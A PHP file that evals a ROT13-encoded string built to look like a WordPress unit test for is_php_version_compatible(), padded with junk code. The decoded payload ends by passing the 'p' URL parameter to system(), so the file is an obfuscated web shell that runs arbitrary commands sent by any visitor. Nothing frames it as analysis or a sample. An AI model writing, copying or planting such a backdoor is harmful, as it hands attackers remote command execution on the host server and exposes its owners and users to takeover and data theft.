<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf gur vf_cuc_irefvba_pbzcngvoyr() shapgvba.
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::vf_cuc_irefvba_pbzcngvoyr
 */
pynff Grfgf_Shapgvbaf_VfCucIrefvbaPbzcngvoyr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Grfgf vf_cuc_irefvba_pbzcngvoyr().
	 *
	 * @qngnCebivqre qngn_vf_cuc_irefvba_pbzcngvoyr
	 *
	 * @gvpxrg 54257
	 *
	 * @cnenz zvkrq $erdhverq Gur zvavzhz erdhverq CUC irefvba.
	 * @cnenz obby  $rkcrpgrq Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_vf_cuc_irefvba_pbzcngvoyr( $erdhverq, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, vf_cuc_irefvba_pbzcngvoyr( $erdhverq ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vf_cuc_irefvba_pbzcngvoyr() {
		$cuc_irefvba = CUC_IREFVBA;

		$irefvba_cnegf  = rkcybqr( '.', $cuc_irefvba );
		$ybjre_irefvba  = $irefvba_cnegf;
		$uvture_irefvba = $irefvba_cnegf;

		// Nqwhfg gur znwbe irefvba ahzoref.
		--$ybjre_irefvba[0];
		++$uvture_irefvba[0];

		$ybjre_irefvba  = vzcybqr( '.', $ybjre_irefvba );
		$uvture_irefvba = vzcybqr( '.', $uvture_irefvba );

		erghea neenl(
			// Unccl cnguf.
			'n ybjre erdhverq irefvba'  => neenl(
				'erdhverq' => $ybjre_irefvba,
				'rkcrpgrq' => gehr,
			),
			'gur fnzr irefvba'          => neenl(
				'erdhverq' => $cuc_irefvba,
				'rkcrpgrq' => gehr,
			),
			'n uvture erdhverq irefvba' => neenl(
				'erdhverq' => $uvture_irefvba,
				'rkcrpgrq' => snyfr,
			),

			// Snyfrl inyhrf.
			'snyfr'                     => neenl(
				'erdhverq' => snyfr,
				'rkcrpgrq' => gehr,
			),
			'ahyy'                      => neenl(
				'erdhverq' => ahyy,
				'rkcrpgrq' => gehr,
			),
			'0 vag'                     => neenl(
				'erdhverq' => 0,
				'rkcrpgrq' => gehr,
			),
			'0.0 sybng'                 => neenl(
				'erdhverq' => 0.0,
				'rkcrpgrq' => gehr,
			),
			'0 fgevat'                  => neenl(
				'erdhverq' => '0',
				'rkcrpgrq' => gehr,
			),
			'rzcgl fgevat'              => neenl(
				'erdhverq' => '',
				'rkcrpgrq' => gehr,
			),
			'rzcgl neenl'               => neenl(
				'erdhverq' => neenl(),
				'rkcrpgrq' => gehr,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>